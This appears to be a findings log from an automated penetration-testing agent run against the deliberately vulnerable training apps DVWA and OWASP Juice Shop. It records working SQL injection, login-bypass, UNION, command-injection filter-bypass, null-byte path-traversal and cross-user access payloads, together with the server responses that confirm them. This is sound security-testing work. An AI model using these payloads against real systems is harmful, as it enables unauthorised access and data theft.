findings.title: DVWA SQL Injection (boolean) in id parameter [security=low]
findings.response_evidence: [security=low] TRUE payload `1' OR '1'='1` returned MULTIPLE seeded user surnames: admin (admin), Gordon Brown, Hack Me, Pablo Picasso, Bob Smith (5 records). FALSE payload `1' AND '1'='2` returned ZERO records (User ID: with empty result, no <pre> surname blocks). Differential boolean behavior confirms SQL injection.

findings.title: OS Command Injection (HIGH) on DVWA exec
findings.response_evidence: [security=high] Footer confirms 'Security Level: high'. HIGH blacklist strips '; ', '| ' (pipe+space), and '&&'. Bypass with pipe and NO trailing space: `127.0.0.1|whoami`. Response pre block output contained the web-process identity: 'www-data'. Confirms command execution as www-data.

findings.title: Cross-User Basket Access / BOLA on /rest/basket/{id}
request_sequence: GET /rest/basket/6 (session=juiceshop_acct1) -> own_basket_id=6, UserId=22, Apple Juice (1000ml) qty 3
findings.response_evidence: acct1 (acct1_bench@juiceshop.local) owns basket id=6 (session_info.own_basket_id=6), UserId 22, containing distinct seeded item "Apple Juice (1000ml)" quantity 3. Authenticated as acct2 (acct2_bench@juiceshop.local, own_basket_id=7), GET /rest/basket/6 returned HTTP 200 with the SAME basket: {"id":6,"UserId":22,...Products:[{"name":"Apple Juice (1000ml)",...BasketItem:{quantity:3}}]}. acct2 accessed acct1's basket contents with no ownership check — BOLA confirmed.

findings.title: Login Authentication-Bypass SQL Injection on /rest/user/login
findings.response_evidence: HTTP 200 returned a valid authentication token for the first user: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. The injected email `' OR 1=1--` with an arbitrary password authenticated as admin@juice-sh.op (bid:1) — SQL injection auth bypass confirmed.

findings.title: Product-Search SQL Injection on /rest/products/search
request_sequence: GET /rest/products/search?q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- (session=unauth) -> HTTP 200 with injected columns
findings.response_evidence: Single quote q=qwert' returned HTTP 500: "Error: SQLITE_ERROR: near \"'%'\": syntax error" (raw SQL error leaked), proving q is concatenated into a SQLite query. The 9-column UNION q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- returned HTTP 200 with the injected literals mapped into result fields: {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}. Successful UNION injection confirms exploitable SQLi.

Listing body: "listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM". findings.title: Unauthenticated User-Feedback Endpoint (emails masked, no full PII disclosure)
findings.response_evidence: HTTP 200 unauthenticated returns {"status":"success","data":[...]} with 8 feedback records. However the author email addresses are MASKED, not fully disclosed: e.g. "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)". The verification criterion requires the endpoint to DISCLOSE author email addresses (readable PII); here only obfuscated/partially-masked local-parts and the shared domain are visible, which does not constitute full email-address disclosure. Rejected against the strict CWE-359 email-disclosure criterion. (Note: record id=4 does leak a crypto wallet mnemonic seed phrase in free-text, a separate sensitive-data concern worth coordinator follow-up, but not an author email address.)

findings.title: Poison Null-Byte Path Traversal bypasses /ftp/ extension filter to retrieve restricted package.json.bak
findings.response_evidence:
Step 1 (raw path, blocked): GET /ftp/package.json.bak returned HTTP 403 with body: "Error: Only .md and .pdf files are allowed!" thrown at verify (/juice-shop/build/routes/fileServer.js:55:18). Content-Type text/html. This confirms the server-side extension whitelist (.md/.pdf only) blocks direct .bak retrieval.

Step 2 (null-byte bypass, success): GET /ftp/package.json.bak%2500.md returned HTTP 200, Content-Type application/octet-stream, delivering the ACTUAL restricted backup file content (raw JSON, not an HTML error page). Verbatim excerpt from the retrieved file:
{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application",
  "homepage": "http://owasp-juice.shop",
  "author": "Björn Kimminich <bjoern.kimminich@owasp.org> ...",
  ...
  "dependencies": {
    "body-parser": "~1.18",
    "express": "~4.16",
    "express-jwt": "0.1.3",
    "jsonwebtoken": "~8",
    "sanitize-html": "1.4.2",
    "sequelize": "~4",
    "sqlite3": "~3.1.13",
    ...
  }

The URL-encoded null byte (%2500) truncates the filename before the .md check so the extension whitelist sees ".md" while the filesystem opens "package.json.bak", exposing the restricted backup. BOTH conditions hold: 403 on raw .bak path AND 200 with real backup JSON content (name/version/dependencies) via the null-byte bypass.

findings.title: SQL Injection (numeric boolean bypass) at DVWA security=medium
findings.response_evidence: [security=medium] At medium the 'id' POST field is mysqli_real_escape_string'd, so a numeric boolean bypass is used (no quotes). TRUE payload 'id=1 OR 1=1' returned MULTIPLE seeded records: 'First name: admin Surname: admin', 'Gordon Surname: Brown', 'Hack Surname: Me', 'Pablo Surname: Picasso', 'Bob Surname: Smith'. FALSE payload 'id=1 AND 1=2' returned ZERO records (no 'First name/Surname' blocks rendered). This differential confirms SQL injection. Page footer: 'Security Level: medium'.

findings.title: SQL Injection (HIGH, out-of-band session input) on DVWA sqli
findings.response_evidence: [security=high] Footer confirms 'Security Level: high'. TRUE payload `1' OR '1'='1' #` (trailing comment required due to appended LIMIT 1) returned 5 seeded records with surnames: admin, Brown, Me, Picasso, Smith (First names: admin, Gordon, Hack, Pablo, Bob). FALSE control `1' AND '1'='2' #` returned ZERO records (empty result). Out-of-band vector: id stored via session-input.php, injection executes when /vulnerabilities/sqli/ renders.

The verifier correctly determined that at security=high the canary's `<script>` tag is stripped by the case-insensitive regex / htmlspecialchars sanitization and the only executing canary residue in the DOM is leftover from the prior low-level injection, not a genuine high-level bypass. state.halt_reason: All in-scope vulnerability classes have been thoroughly mapped and verified across both targets. Spending more HTTP/LLM budget would yield no new valid findings. Clean completion.
